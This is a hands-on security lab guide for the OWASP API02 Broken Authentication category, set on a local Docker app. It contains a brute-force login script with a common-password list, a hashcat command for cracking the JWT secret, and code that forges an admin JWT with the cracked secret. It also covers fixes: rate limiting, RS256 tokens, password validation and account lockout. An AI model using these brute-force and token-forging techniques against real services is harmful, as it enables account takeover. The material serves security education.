# Lab Instructions: API02 Broken Authentication

## Introduction

Welcome to the Broken Authentication lab! In this hands-on exercise, you'll discover how weak authentication mechanisms in APIs can lead to complete account compromise, token forgery, and unauthorized access.

**Time Required**: 30-45 minutes  
**Difficulty**: Beginner to Intermediate

## Learning Path

This lab follows a structured approach:
1. **Setup** - Get the lab running
2. **Explore** - Understand the API's authentication
3. **Discover** - Find the authentication vulnerabilities
4. **Exploit** - Safely demonstrate the security flaws
5. **Understand** - Learn why this is dangerous
6. **Fix** - Implement proper authentication
7. **Verify** - Test that the fix works

---

## Part 1: Setup and Initial Exploration (10 minutes)

### Task 1.1: Start the Lab

```bash
# Navigate to the lab directory
cd OWASP-API/API02-Broken-Authentication/lab/api02-weak-auth-lab/

# Start the application
docker-compose up
```

**Expected Output**:
```
✓ API running on http://localhost:5000
✓ Educational demonstration - SAFE isolated environment
✓ Demonstrates Broken Authentication vulnerabilities
```

### Task 1.2: Access the Web Interface

1. Open your browser to **http://localhost:5000**
2. You should see the authentication lab interface
3. Observe the displayed vulnerabilities:
   - No rate limiting
   - Weak JWT secret
   - No token expiration
   - Weak password policy

### Task 1.3: Login as Alice

1. The login form is pre-filled with:
   - **Email**: `alice@example.com`
   - **Password**: `password123`
2. Click **Login**
3. Observe:
   - A JWT token is displayed
   - User information is shown
   - The token has NO expiration warning

**Questions to Consider**:
- What information is in the JWT?
- How long is the token valid?
- Can you decode the JWT (try jwt.io)?

---

## Part 2: Discovering Authentication Vulnerabilities (10 minutes)

### Task 2.1: Test Rate Limiting (Brute Force)

Try logging in multiple times with wrong passwords:

1. Change the password to something incorrect
2. Click **Login** repeatedly (10-20 times)
3. Observe: All attempts are processed!

**Expected Result**: No rate limiting - all login attempts succeed or fail immediately.

```bash
# Try this via curl to see unlimited attempts
for i in {1..20}; do
  echo "Attempt $i"
  curl -X POST http://localhost:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"alice@example.com","password":"wrong"}'
  echo ""
done
```

**❗ VULNERABILITY CONFIRMED**: No rate limiting allows brute force attacks.

### Task 2.2: Analyze the JWT Token

1. Copy your JWT token from the login response
2. Go to https://jwt.io/
3. Paste the token in the "Encoded" section
4. Observe the decoded token:

```json
{
  "user_id": 1,
  "username": "alice",
  "email": "alice@example.com",
  "role": "user"
}
```

**Key Observations**:
- ❌ No `exp` (expiration) claim
- ❌ No `iat` (issued at) claim
- ❌ No `jti` (unique token ID)
- ❌ Algorithm is HS256 (symmetric)

### Task 2.3: Test Token Expiration

1. Login and save the token
2. Click **Logout**
3. Click **Get My Info** button
4. Observe: Token still works after logout!

**❗ VULNERABILITY CONFIRMED**: Tokens never expire and aren't revoked on logout.

### Task 2.4: Test Weak Password Policy

1. Click on the **Register New User** panel
2. Try registering with extremely weak passwords:
   - Username: `test1`
   - Email: `test1@example.com`
   - Password: `123` (only 3 characters!)
3. Click **Register**
4. Observe: Registration succeeds!

**Try even weaker passwords**:
- `12` (2 characters)
- `password` (common password)
- `admin` (super common)
- `abc` (simple pattern)

**❗ VULNERABILITY CONFIRMED**: No password strength validation.

---

## Part 3: Understanding the Vulnerabilities (10 minutes)

### Task 3.1: Review the Vulnerable Code

Open `app/server.py` and locate the `/api/login` endpoint:

```python
@app.route('/api/login', methods=['POST'])
def login():
    """
    VULNERABILITIES:
    1. No rate limiting - unlimited attempts
    2. Weak JWT secret - "secret123"
    3. No token expiration - valid forever
    """
    # ... authentication logic ...
    
    # VULNERABLE JWT creation
    token = jwt.encode(
        {
            'user_id': user['id'],
            'username': user['username'],
            'email': user['email'],
            'role': user['role']
            # MISSING: 'exp', 'iat', 'jti'
        },
        JWT_SECRET,  # "secret123" - WEAK!
        algorithm='HS256'  # Symmetric algorithm
    )
    
    return jsonify({'access_token': token})
```

**Identify the Problems**:
1. ❌ No `@limiter.limit()` decorator
2. ❌ `JWT_SECRET = 'secret123'` (weak and hardcoded)
3. ❌ No expiration time in JWT payload
4. ❌ HS256 instead of RS256
5. ❌ No failed login tracking
6. ❌ No account lockout mechanism

### Task 3.2: Review Password Validation

Find the `/api/register` endpoint:

```python
@app.route('/api/register', methods=['POST'])
def register():
    password = data.get('password', '')
    
    # VULNERABILITY: No password validation!
    # Accepts ANY password
    
    user.password = generate_password_hash(password)
```

**Missing Security Checks**:
- No minimum length requirement
- No complexity requirements (uppercase, numbers, special chars)
- No common password checking
- No breach database checking

### Task 3.3: Understand the Attack Vectors

The vulnerabilities enable multiple attack vectors:

```
1. Brute Force Attack:
   - No rate limiting
   - Try unlimited passwords
   - Eventually crack weak passwords
   
2. JWT Secret Cracking:
   - Capture JWT token
   - Use hashcat to crack "secret123"
   - Forge tokens with any claims
   
3. Token Theft & Reuse:
   - Steal token (XSS, network sniffing)
   - Token valid forever
   - No revocation possible
   
4. Credential Stuffing:
   - Use leaked credentials from breaches
   - Try against this API (no rate limit)
   - Weak passwords increase success rate
```

### Task 3.4: Real-World Impact

In a production scenario, these vulnerabilities lead to:

- 🔴 **Account Takeover**: Attackers gain full access to accounts
- 🔴 **Privilege Escalation**: Forge admin tokens
- 🔴 **Data Breach**: Access sensitive user data
- 🔴 **Compliance Violations**: GDPR, PCI-DSS, HIPAA fines
- 🔴 **Reputation Damage**: Loss of customer trust
- 🔴 **Financial Loss**: Fraud, legal liability

**Real Examples**:
- 2020: Twitter - 5.4M accounts via API auth flaw
- 2021: T-Mobile - Weak API auth led to breach
- Many: Credential stuffing attacks succeed daily

---

## Part 4: Exploiting the Vulnerabilities (10 minutes)

### Task 4.1: Brute Force Attack Simulation

Create a simple script to demonstrate brute force:

```python
# brute_force.py
import requests

url = "http://localhost:5000/api/login"
email = "bob@example.com"

# Common passwords to try
passwords = [
    "123456", "password", "12345678", "qwerty", 
    "123456789", "12345", "1234", "111111", 
    "1234567", "dragon", "123123", "baseball", 
    "iloveyou", "trustno1", "1234567890", "sunshine",
    "admin"  # Bob's actual password!
]

print(f"Attempting brute force on {email}...")
print(f"Trying {len(passwords)} passwords (no rate limit!)...\n")

for i, pwd in enumerate(passwords, 1):
    response = requests.post(url, json={"email": email, "password": pwd})
    
    if response.status_code == 200:
        print(f"✓ SUCCESS on attempt {i}!")
        print(f"✓ Password found: {pwd}")
        print(f"✓ Token: {response.json()['access_token'][:50]}...")
        break
    else:
        print(f"✗ Attempt {i}: {pwd} - Failed")

print("\n⚠️ Attack succeeded because there's no rate limiting!")
```

Run it: `python3 brute_force.py`

### Task 4.2: Crack JWT Secret (Conceptual)

While we won't run actual cracking tools, here's how it works:

```bash
# 1. Get a valid JWT token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 2. Use hashcat to crack the secret
# hashcat -m 16500 jwt.txt wordlist.txt
# Result: "secret123" (found in seconds!)

# 3. Forge a token with Python
python3 << 'PYEOF'
import jwt

# Forge admin token
forged_token = jwt.encode(
    {
        'user_id': 999,
        'username': 'hacker',
        'email': 'hacker@evil.com',
        'role': 'admin'  # Escalate to admin!
    },
    'secret123',  # Cracked secret
    algorithm='HS256'
)

print(f"Forged admin token: {forged_token}")
PYEOF
```

### Task 4.3: Use Forged Token

1. In the web interface, use browser console:
```javascript
// Set forged token
currentToken = "eyJhbGc...";  // Your forged token
currentUser = {username: 'hacker', role: 'admin'};
updateSessionInfo();

// Try admin endpoint
getAdminUsers();
```

2. Or use curl:
```bash
FORGED_TOKEN="<your-forged-token>"

curl http://localhost:5000/api/admin/users \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

**Expected Result**: Admin endpoint accessible with forged token!

---

## Part 5: Fixing the Vulnerabilities (15 minutes)

### Task 5.1: Implement Rate Limiting

Edit `app/server.py`:

**Add at the top**:
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)
```

**Update login endpoint**:
```python
@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")  # Add this!
@limiter.limit("20 per hour")   # Add this!
def login():
    # ... rest of code ...
```

**Add to requirements.txt**:
```
Flask-Limiter==3.5.0
```

### Task 5.2: Strengthen JWT Implementation

**Generate RSA keys** (one-time setup):
```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Generate private key
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)

# Save private key
with open('private_key.pem', 'wb') as f:
    f.write(private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    ))

# Save public key
public_key = private_key.public_key()
with open('public_key.pem', 'wb') as f:
    f.write(public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ))
```

**Update JWT creation**:
```python
from datetime import datetime, timedelta
import uuid

# Load keys at startup
with open('private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

with open('public_key.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(f.read())

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # ... authentication logic ...
    
    # SECURE JWT creation
    token = jwt.encode(
        {
            'user_id': user['id'],
            'username': user['username'],
            'email': user['email'],
            'role': user['role'],
            'exp': datetime.utcnow() + timedelta(minutes=15),  # 15 min expiration
            'iat': datetime.utcnow(),  # Issued at
            'jti': str(uuid.uuid4())  # Unique token ID
        },
        private_key,  # Use private key
        algorithm='RS256'  # Use RS256
    )
    
    return jsonify({'access_token': token, 'expires_in': 900})
```

### Task 5.3: Add Password Validation

```python
import re

def validate_password(password):
    """Validate password meets security requirements"""
    errors = []
    
    if len(password) < 12:
        errors.append("Password must be at least 12 characters")
    
    if not re.search(r'[A-Z]', password):
        errors.append("Password must contain uppercase letter")
    
    if not re.search(r'[a-z]', password):
        errors.append("Password must contain lowercase letter")
    
    if not re.search(r'[0-9]', password):
        errors.append("Password must contain number")
    
    if not re.search(r'[!@#$%^&*]', password):
        errors.append("Password must contain special character")
    
    # Check common passwords
    common = ['password', '123456', 'admin', 'qwerty']
    if password.lower() in common:
        errors.append("Password is too common")
    
    return len(errors) == 0, errors

@app.route('/api/register', methods=['POST'])
def register():
    password = data.get('password', '')
    
    # Validate password
    valid, errors = validate_password(password)
    if not valid:
        return jsonify({
            'error': 'Password does not meet requirements',
            'details': errors
        }), 400
    
    # Create user
    # ...
```

### Task 5.4: Rebuild and Restart

```bash
# Stop the current container
docker-compose down

# Rebuild with updated requirements
docker-compose up --build
```

---

## Part 6: Verification Testing (10 minutes)

### Task 6.1: Test Rate Limiting

Try the brute force script again:

```bash
python3 brute_force.py
```

**Expected Result**: After 5 attempts, you should get HTTP 429 (Too Many Requests).

### Task 6.2: Test JWT Security

1. Login and get a new token
2. Go to jwt.io and decode it
3. Verify:
   - ✓ Algorithm is RS256
   - ✓ Has `exp` (expiration) claim
   - ✓ Has `iat` (issued at) claim
   - ✓ Has `jti` (unique ID) claim

4. Try to forge a token:
```python
import jwt

# Try to forge with old secret
forged = jwt.encode(
    {'user_id': 1, 'role': 'admin'},
    'secret123',
    algorithm='HS256'
)

# Try to use forged token
# Should fail - server only accepts RS256
```

### Task 6.3: Test Token Expiration

1. Login and save token
2. Wait 15 minutes (or modify exp to 1 minute for testing)
3. Try to use expired token
4. Should get: `401 Unauthorized - Token expired`

### Task 6.4: Test Password Validation

Try to register with weak passwords:

```bash
curl -X POST http://localhost:5000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test",
    "email": "test@example.com",
    "password": "123"
  }'
```

**Expected Result**: 
```json
{
  "error": "Password does not meet requirements",
  "details": [
    "Password must be at least 12 characters",
    "Password must contain uppercase letter",
    ...
  ]
}
```

---

## Part 7: Additional Challenges (Optional)

### Challenge 1: Implement Token Blacklist

Add logout functionality that actually revokes tokens:

```python
import redis

redis_client = redis.Redis(host='localhost', port=6379)

@app.route('/api/logout', methods=['POST'])
@jwt_required()
def logout():
    token = get_jwt_token()
    payload = jwt.decode(token, public_key, algorithms=['RS256'])
    
    # Add to blacklist with TTL
    jti = payload['jti']
    exp = payload['exp']
    ttl = exp - datetime.utcnow().timestamp()
    
    redis_client.setex(f'blacklist:{jti}', int(ttl), 'revoked')
    
    return jsonify({'message': 'Logged out successfully'})
```

### Challenge 2: Add MFA (Multi-Factor Authentication)

Implement TOTP-based MFA:

```python
import pyotp

class User:
    def enable_mfa(self):
        self.mfa_secret = pyotp.random_base32()
        return pyotp.totp.TOTP(self.mfa_secret).provisioning_uri(
            name=self.email,
            issuer_name='Your API'
        )
    
    def verify_mfa(self, code):
        totp = pyotp.TOTP(self.mfa_secret)
        return totp.verify(code, valid_window=1)
```

### Challenge 3: Implement Account Lockout

Add account lockout after failed attempts:

```python
failed_attempts = {}  # In production, use Redis

def record_failed_login(email):
    failed_attempts[email] = failed_attempts.get(email, 0) + 1
    if failed_attempts[email] >= 10:
        lock_account(email)

def is_account_locked(email):
    # Check if account is locked
    pass

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    email = data.get('email')
    
    if is_account_locked(email):
        return jsonify({'error': 'Account locked'}), 403
    
    # ... authentication ...
    
    if not valid:
        record_failed_login(email)
        return jsonify({'error': 'Invalid credentials'}), 401
```

---

## Key Takeaways

### What You Learned

✅ **Rate limiting is essential** - Prevents brute force and credential stuffing  
✅ **JWT security matters** - Algorithm, secret, and expiration are all critical  
✅ **Password policies protect users** - Enforce strong requirements  
✅ **Token management is key** - Expiration and revocation are mandatory  
✅ **Defense in depth** - Multiple layers of security  

### Authentication Security Checklist

- [ ] Rate limiting on all auth endpoints (5/min)
- [ ] Strong JWT implementation (RS256, 15min exp)
- [ ] Secure password policy (12+ chars, complexity)
- [ ] Token expiration and refresh mechanism
- [ ] Account lockout after failed attempts
- [ ] MFA option available
- [ ] Secure token storage (httpOnly cookies)
- [ ] Token revocation on logout
- [ ] Audit logging of auth events

### Common Mistakes to Avoid

❌ Using HS256 with weak secrets  
❌ No token expiration  
❌ No rate limiting on auth endpoints  
❌ Accepting weak passwords  
❌ No account lockout mechanism  
❌ Storing tokens in localStorage (XSS risk)  
❌ Not revoking tokens on logout  

---

## Clean Up

When you're done with the lab:

```bash
# Stop the containers
docker-compose down

# Remove volumes (optional)
docker-compose down -v
```

---

## Questions for Reflection

1. **Why is rate limiting critical?** What attacks does it prevent?

2. **What makes HS256 less secure than RS256?** When would you use each?

3. **Why do tokens need expiration?** What's a good expiration time?

4. **How do weak passwords enable attacks?** What makes a password strong?

5. **What is defense in depth?** How does it apply to authentication?

---

## Additional Resources

- [OWASP API Security Top 10 - API2:2023](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Have I Been Pwned API](https://haveibeenpwned.com/API/v3)

---

**Congratulations!** You've completed the Broken Authentication lab. You now understand critical authentication vulnerabilities and how to prevent them.

*Part of the [OWASP API Security Top 10 Educational Repository](../../../../README.md)*
